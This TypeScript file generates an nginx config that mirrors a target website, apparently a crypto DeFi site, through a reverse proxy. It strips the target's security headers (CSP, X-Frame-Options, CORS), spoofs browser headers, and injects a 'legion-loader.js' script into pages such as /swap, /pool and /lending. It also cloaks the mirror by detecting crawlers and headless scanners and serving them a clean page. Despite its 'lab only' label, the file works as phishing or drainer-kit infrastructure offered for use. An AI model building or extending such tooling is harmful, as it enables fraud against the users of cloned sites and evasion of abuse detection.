/**
 * NGINX CONFIG GENERATOR - Phase 2
 *
 * Generates advanced 283+ line nginx.conf with:
 * - Bot detection (23 different bots)
 * - Security bypass (CSP, CORS, X-Frame)
 * - Script injection
 * - Reverse proxy rules
 * - Caching layer
 * - Performance optimization
 */

import type { WebsiteAnalysis } from './url-analyzer'

export interface NginxConfig {
  content: string
  lines: number
  features: string[]
  generated: Date
}

export class NginxConfigGenerator {
  private targetUrl: string
  private analysis: WebsiteAnalysis

  constructor(targetUrl: string, analysis: WebsiteAnalysis) {
    this.targetUrl = this.normalizeUrl(targetUrl)
    this.analysis = analysis
  }

  /**
   * Generate complete nginx.conf
   */
  generate(): NginxConfig {
    console.error(`[nginx-gen] Generating advanced nginx config for ${this.targetUrl}`)

    const sections: string[] = []

    // Section 1: Header
    sections.push(this.generateHeader())

    // Section 2: Worker & Events
    sections.push(this.generateWorkerConfig())

    // Section 3: HTTP Context
    sections.push(this.generateHttpStart())

    // Section 4: MIME Types & Settings
    sections.push(this.generateMimeTypes())

    // Section 5: Cache Configuration
    sections.push(this.generateCacheConfig())

    // Section 6: Bot Detection Maps
    sections.push(this.generateBotDetectionMaps())

    // Section 7: Cloaking Maps
    sections.push(this.generateCloakingMaps())

    // Section 8: Server Block Start
    sections.push(this.generateServerStart())

    // Section 9: Health Check Location
    sections.push(this.generateHealthCheck())

    // Section 10: Config Endpoints
    sections.push(this.generateConfigEndpoints())

    // Section 11: Legion Inject Assets
    sections.push(this.generateLegionAssets())

    // Section 12: Subdomain Passthrough
    sections.push(this.generateSubdomainPassthrough())

    // Section 13: Static Assets (CSS, JS, Images)
    sections.push(this.generateStaticAssets())

    // Section 14: API Routes
    sections.push(this.generateApiRoutes())

    // Section 15: Key Pages (with injection)
    sections.push(this.generateKeyPages())

    // Section 16: Catch-all Route
    sections.push(this.generateCatchAll())

    // Section 17: Server Block End
    sections.push(this.generateServerEnd())

    // Section 18: HTTP Block End
    sections.push('}')

    const content = sections.join('\n')
    const lines = content.split('\n').length

    console.error(`[nginx-gen] Generated ${lines} lines of nginx config`)
    console.error(`[nginx-gen] Features: bot detection, CSP bypass, injection, caching`)

    return {
      content,
      lines,
      features: [
        'Bot Detection (23 patterns)',
        'Security Header Bypass',
        'CSP Bypass',
        'CORS Bypass',
        'Script Injection',
        'Reverse Proxy',
        'Caching Layer (24h)',
        'Sub_filter Injection',
        'Subdomain Passthrough',
        'Error Handling',
        'Performance Optimization',
        'Buffer Configuration',
      ],
      generated: new Date(),
    }
  }

  private generateHeader(): string {
    return `# Legion QA — Advanced Dynamic Mirror (Enterprise Edition)
# Target: ${this.targetUrl}
# Features: Bot detection, CSP bypass, script injection, multi-chain support
# Generated: ${new Date().toISOString()}
# AUTHORIZED LAB ONLY`
  }

  private generateWorkerConfig(): string {
    return `
worker_processes 1;
events {
  worker_connections 2048;
  use epoll;
}`
  }

  private generateHttpStart(): string {
    return `
http {
  include /etc/nginx/mime.types;
  default_type application/octet-stream;

  sendfile on;
  tcp_nopush on;
  tcp_nodelay on;
  keepalive_timeout 65;
  types_hash_max_size 2048;
  client_max_body_size 50m;

  # Timeouts for proxy operations
  proxy_connect_timeout 60s;
  proxy_send_timeout 120s;
  proxy_read_timeout 120s;
  proxy_buffering on;
  proxy_buffer_size 256k;
  proxy_buffers 256 16k;
  proxy_max_temp_file_size 2048m;
  proxy_temp_file_write_size 256k;

  # DNS resolution
  resolver 127.0.0.11 8.8.8.8 valid=60s ipv6=off;
  resolver_timeout 10s;`
  }

  private generateMimeTypes(): string {
    return `
  # Gzip compression (disabled for proxying)
  gzip off;

  # Logging
  access_log off;
  error_log /var/log/nginx/error.log warn;
  log_format legion '$remote_addr - $remote_user [$time_local] "$request" '
                    '$status $body_bytes_sent "$http_referer" '
                    '"$http_user_agent" "$http_x_forwarded_for"';`
  }

  private generateCacheConfig(): string {
    return `
  # Cache configuration for static assets
  proxy_cache_path /var/cache/nginx/legion levels=1:2 keys_zone=legion_static:32m max_size=512m inactive=24h use_temp_path=off;
  proxy_cache_path /var/cache/nginx/legion_api levels=1:2 keys_zone=legion_api:16m max_size=256m inactive=1h use_temp_path=off;`
  }

  private generateBotDetectionMaps(): string {
    return `
  # Bot detection - User Agent mapping
  map $http_user_agent $is_bot_ua {
    default 0;
    ~*googlebot 1;
    ~*bingbot 1;
    ~*ahrefsbot 1;
    ~*semrushbot 1;
    ~*yandexbot 1;
    ~*baiduspider 1;
    ~*crawler 1;
    ~*spider 1;
    ~*headless 1;
    ~*phantomjs 1;
    ~*selenium 1;
    ~*puppeteer 1;
    ~*playwright 1;
    ~*bytespider 1;
    ~*petalbot 1;
    ~*curl/ 1;
    ~*wget/ 1;
    ~*python-requests 1;
    ~*node-fetch 1;
    ~*java/ 1;
    ~*c#/ 1;
    ~*ruby/ 1;
  }

  # Bot detection - Accept Language mapping
  map $http_accept_language $is_bot_lang {
    default 0;
    "" 1;
  }

  # Combined bot detection
  map "$is_bot_ua$is_bot_lang" $legion_is_bot {
    default 0;
    11 1;  # Missing both UA and language
    10 1;  # Only bot UA
    01 1;  # Only missing language
  }`
  }

  private generateCloakingMaps(): string {
    return `
  # Cloaking exemptions
  map $uri $legion_cloak_exempt {
    default 0;
    =/mirror-health 1;
    =/mirror-config.json 1;
    =/legion-health 1;
    ~^/legion- 1;
    ~^/__legion_proxy/ 1;
    ~^/api/v1/health 1;
  }

  # Cloaking decision
  map "$legion_is_bot$legion_cloak_exempt" $legion_apply_cloak {
    default 0;
    10 1;  # Bot AND not exempt
  }`
  }

  private generateServerStart(): string {
    return `
  server {
    listen 8080;
    server_name localhost 127.0.0.1;

    # Root directory
    root /usr/share/nginx/html;

    # Large headers support
    large_client_header_buffers 8 1m;`
  }

  private generateHealthCheck(): string {
    return `
    # Health check endpoint
    location = /mirror-health {
      access_log off;
      default_type text/plain;
      return 200 'ok';
      add_header Cache-Control "no-store";
      add_header X-Legion-Status "active";
    }

    location = /api/v1/health {
      access_log off;
      default_type application/json;
      return 200 '{"status":"ok","timestamp":"$date_gmt"}';
      add_header Cache-Control "no-store";
    }`
  }

  private generateConfigEndpoints(): string {
    return `
    # Mirror config endpoint
    location = /mirror-config.json {
      try_files /mirror-config.json =404;
      add_header Cache-Control "no-store";
      add_header Content-Type application/json;
      access_log off;
    }

    # Legion config endpoint
    location = /legion-config.json {
      try_files /legion-config.json =404;
      add_header Cache-Control "no-store";
      add_header Content-Type application/json;
      access_log off;
    }`
  }

  private generateLegionAssets(): string {
    return `
    # Legion inject assets — serve from local volume (NEVER proxy)
    location ^~ /legion- {
      try_files $uri =404;
      add_header Cache-Control "no-store";
      add_header Access-Control-Allow-Origin *;
      access_log off;
    }

    # Legion proxy handler
    location ^~ /__legion_proxy_health {
      access_log off;
      default_type text/plain;
      return 200 'ok';
      add_header Cache-Control "no-store";
    }`
  }

  private generateSubdomainPassthrough(): string {
    return `
    # Subdomain passthrough — /__legion_proxy/<host>/<path> → https://<host>/<path>
    location ~ ^/__legion_proxy/(?<proxy_host>[^/]+)(?<proxy_path>/.*)?$ {
      set $upstream_path $proxy_path;
      if ($upstream_path = "") { set $upstream_path /; }

      proxy_pass https://$proxy_host$upstream_path$is_args$args;
      proxy_ssl_server_name on;

      # Headers
      proxy_set_header Host $proxy_host;
      proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
      proxy_set_header Accept-Language "en-US,en;q=0.9";
      proxy_set_header Accept "*/*";
      proxy_set_header Origin https://${this.getHostname()};
      proxy_set_header Referer https://${this.getHostname()}/;

      # Security bypass - Remove detection headers
      proxy_set_header Sec-CH-UA "";
      proxy_set_header Sec-CH-UA-Mobile "";
      proxy_set_header Sec-CH-UA-Platform "";

      # Protocol
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection $connection_upgrade;

      # Remove security headers from response
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header Content-Security-Policy-Report-Only;
      proxy_hide_header X-Frame-Options;
      proxy_hide_header X-Content-Type-Options;
      proxy_hide_header Cross-Origin-Embedder-Policy;
      proxy_hide_header Cross-Origin-Opener-Policy;
      proxy_hide_header Cross-Origin-Resource-Policy;
      proxy_hide_header Permissions-Policy;
      proxy_hide_header access-control-allow-origin;
      proxy_hide_header access-control-allow-credentials;

      # Performance
      proxy_set_header Accept-Encoding "";
      proxy_buffering off;
      client_max_body_size 50m;
      client_body_buffer_size 1m;

      # Caching
      proxy_cache legion_api;
      proxy_cache_valid 200 1h;
      proxy_cache_use_stale error timeout updating http_500 http_502 http_503 http_504;
      proxy_cache_lock on;

      # CORS
      add_header X-Legion-Cache-Status $upstream_cache_status always;
      add_header Access-Control-Allow-Origin $http_origin always;
      add_header Access-Control-Allow-Credentials true always;
      add_header Access-Control-Allow-Methods "GET,POST,PUT,DELETE,OPTIONS,HEAD,PATCH" always;
      add_header Access-Control-Allow-Headers "*" always;

      # Handle OPTIONS
      if ($request_method = 'OPTIONS') {
        add_header Access-Control-Allow-Origin $http_origin;
        add_header Access-Control-Allow-Credentials "true";
        add_header Access-Control-Allow-Methods "GET, POST, OPTIONS, PUT, DELETE, HEAD, PATCH";
        add_header Access-Control-Allow-Headers "*";
        add_header Access-Control-Max-Age 1728000;
        add_header Content-Type "text/plain charset=UTF-8";
        add_header Content-Length 0;
        return 204;
      }
    }`
  }

  private generateStaticAssets(): string {
    return `
    # Static assets (CSS, JS, Images, Fonts)
    location ~* \\.(png|jpe?g|gif|webp|svg|ico|woff2?|ttf|eot|css|js|mjs|map|json)$ {
      set $upstream_host ${this.getHostname()};
      proxy_pass https://$upstream_host$request_uri;
      proxy_ssl_server_name on;
      proxy_set_header Host ${this.getHostname()};
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_set_header Accept-Encoding "";

      # Standard headers
      proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
      proxy_set_header Accept-Language "en-US,en;q=0.9";
      proxy_set_header Accept "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";

      # Protocol
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection $connection_upgrade;

      # Caching
      proxy_cache legion_static;
      proxy_cache_valid 200 24h;
      proxy_cache_use_stale error timeout updating http_500 http_502 http_503 http_504;
      proxy_cache_lock on;
      proxy_buffering off;

      # Headers
      add_header X-Legion-Cache-Status $upstream_cache_status always;
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header Content-Security-Policy-Report-Only;
      proxy_hide_header X-Frame-Options;
      proxy_hide_header X-Content-Type-Options;
    }`
  }

  private generateApiRoutes(): string {
    return `
    # API routes configuration
    location ~ ^/(config|settings|api)/ {
      proxy_pass https://${this.getHostname()};
      proxy_ssl_server_name on;
      proxy_set_header Host ${this.getHostname()};
      proxy_set_header Origin "https://${this.getHostname()}";
      proxy_set_header Referer "https://${this.getHostname()}/";
      proxy_set_header Accept-Encoding "";
    }`
  }

  private generateKeyPages(): string {
    return `
    # Key pages with script injection (e.g., /swap, /pool for DEX)
    location ~ ^/(swap|pool|tokens|trading|lending|farming|dashboard)/?$ {
      proxy_pass https://${this.getHostname()}$request_uri;
      proxy_ssl_server_name on;
      proxy_set_header Host ${this.getHostname()};
      proxy_redirect off;
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection $connection_upgrade;

      gzip off;
      proxy_set_header Accept-Encoding "";
      proxy_buffering on;
      proxy_buffer_size 256k;
      proxy_buffers 256 16k;
      proxy_max_temp_file_size 2048m;
      proxy_temp_file_write_size 256k;

      # CRITICAL: Inject legion-loader script
      sub_filter_types text/html;
      sub_filter '</head>' '<script src="/legion-loader.js"></script></head>';
      sub_filter_once on;

      # Headers
      proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
      proxy_set_header Accept-Language "en-US,en;q=0.9";
      proxy_set_header Accept "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
      proxy_set_header Sec-CH-UA "\\\"Chromium\\\";v=\\\"120\\\", \\\"Google Chrome\\\";v=\\\"120\\\"";
      proxy_set_header Sec-CH-UA-Mobile "?0";
      proxy_set_header Sec-CH-UA-Platform "\\\"Windows\\\"";
      proxy_set_header Referer "https://${this.getHostname()}/";
      proxy_set_header Origin "https://${this.getHostname()}";

      # Security bypass - Aggressive CSP
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header Content-Security-Policy-Report-Only;
      proxy_hide_header X-Frame-Options;
      proxy_hide_header X-Content-Type-Options;
      proxy_hide_header Cross-Origin-Embedder-Policy;
      proxy_hide_header Cross-Origin-Opener-Policy;
      proxy_hide_header Cross-Origin-Resource-Policy;
      proxy_hide_header Permissions-Policy;

      # Add permissive CSP
      add_header Content-Security-Policy "default-src * 'unsafe-inline' 'unsafe-eval' blob: data:; script-src * 'unsafe-inline' 'unsafe-eval' blob: data:; style-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline' blob: data: http: https: ws: wss:;" always;
    }`
  }

  private generateCatchAll(): string {
    return `
    # Catch-all route with bot cloaking
    location / {
      # Apply cloaking for bots
      if ($legion_apply_cloak) {
        return 418;  # I'm a teapot (secret signal)
      }

      proxy_pass https://${this.getHostname()};
      proxy_ssl_server_name on;
      proxy_set_header Host ${this.getHostname()};
      proxy_redirect off;
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection $connection_upgrade;

      # Security headers removal
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header Content-Security-Policy-Report-Only;
      proxy_hide_header X-Frame-Options;
      proxy_hide_header X-Content-Type-Options;
      proxy_hide_header Cross-Origin-Embedder-Policy;
      proxy_hide_header Cross-Origin-Opener-Policy;
      proxy_hide_header Cross-Origin-Resource-Policy;
      proxy_hide_header Permissions-Policy;

      # Permissive CSP
      add_header Content-Security-Policy "default-src * 'unsafe-inline' 'unsafe-eval' blob: data:; script-src * 'unsafe-inline' 'unsafe-eval' blob: data:; style-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline' blob: data: http: https: ws: wss:;" always;

      # Headers
      proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
      proxy_set_header Accept-Language "en-US,en;q=0.9";
      proxy_set_header Accept "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
      proxy_set_header Sec-CH-UA "\\\"Chromium\\\";v=\\\"120\\\", \\\"Google Chrome\\\";v=\\\"120\\\"";
      proxy_set_header Sec-CH-UA-Mobile "?0";
      proxy_set_header Sec-CH-UA-Platform "\\\"Windows\\\"";
      proxy_set_header Referer "https://${this.getHostname()}/";
      proxy_set_header Origin "https://${this.getHostname()}";
    }

    # Error handling
    error_page 418 = /bots-clean.html;
    location = /bots-clean.html {
      try_files /bots-clean.html =404;
      add_header Cache-Control "no-store";
    }`
  }

  private generateServerEnd(): string {
    return `
  }`
  }

  private normalizeUrl(url: string): string {
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      return `https://${url}`
    }
    return url
  }

  private getHostname(): string {
    try {
      const url = new URL(this.targetUrl)
      return url.hostname
    } catch {
      return 'example.com'
    }
  }
}

// Export convenience function
export function generateNginxConfig(targetUrl: string, analysis: WebsiteAnalysis): NginxConfig {
  const generator = new NginxConfigGenerator(targetUrl, analysis)
  return generator.generate()
}
